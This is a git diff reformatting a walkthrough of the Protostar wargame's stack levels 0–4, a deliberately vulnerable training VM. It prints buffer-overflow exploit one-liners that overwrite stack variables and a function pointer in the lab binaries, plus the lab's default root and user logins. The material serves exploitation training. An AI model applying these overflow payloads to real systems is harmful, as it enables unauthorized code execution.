@@ -1,9 +1,12 @@
-### Install
+## Wargame/Protostar
 
-> protostar vm on parallels
-> root/godmod and ifconfig
+## VM Configuration
 
-### Stack0
+- protostar vm (parallels, vmware, vmplayer, ...)
+- Login as admin id `root/godmod` and check IP using `ifconfig`
+- ssh `user@ip`, password : `user`
+
+## Stack0
 
 > /opt/protostar/bin/stack0
 
@@ -28,14 +31,18 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `parameter passing to gets()`, `order of local parameters on the stack`, `command line python script` 
+### You should know 
+
+- parameter passing to `gets()`
+- order of local parameters on the stack
+- command line python script
 
 ```
 $ (python -c 'print "A"*64+"BBBB"';cat)|./stack0
 you have changed the 'modified' variable
 ```
 
-### Stack1
+## Stack1
 
 > /opt/protostar/bin/stack1
 
@@ -65,14 +72,16 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `endian in memory`
+### You should know 
+
+- endian in memory
 
 ```
 $ ./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
 you have correctly got the variable to the right value
 ```
 
-### Stack2
+## Stack2
 
 > /opt/protostar/bin/stack2
 
@@ -107,7 +116,10 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `shell variable`, `env variable`
+### You should know 
+
+- shell variable
+- env variable
 
 ```
 $ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
@@ -116,7 +128,7 @@ $ ./stack2
 you have correctly modified the variable
 ```
 
-### Stack3
+## Stack3
 
 > /opt/protostar/bin/stack3
 
@@ -147,7 +159,10 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `getting address of the function`, `objdump`
+### You should know 
+
+- getting address of the function
+- `objdump`
 
 ```
 $ objdump -d ./stack3 | grep win
@@ -157,7 +172,7 @@ calling function pointer, jumping to 0x08048424
 code flow successfully changed
 ```
 
-### Stack4
+## Stack4
 
 > /opt/protostar/bin/stack4
 
@@ -180,7 +195,11 @@ int main(int argc, char **argv)
 }
 ```
 
-The concepts I need to know : `gdb`, `make eip value modified`, `assembly lea    0x10(%esp),%eax`
+### You should know 
+
+- `gdb`
+- make eip value modified
+- assembly : `lea    0x10(%esp),%eax`
 
 ```
 $ scp user@10.211.55.5:/opt/protostar/bin/stack4 .
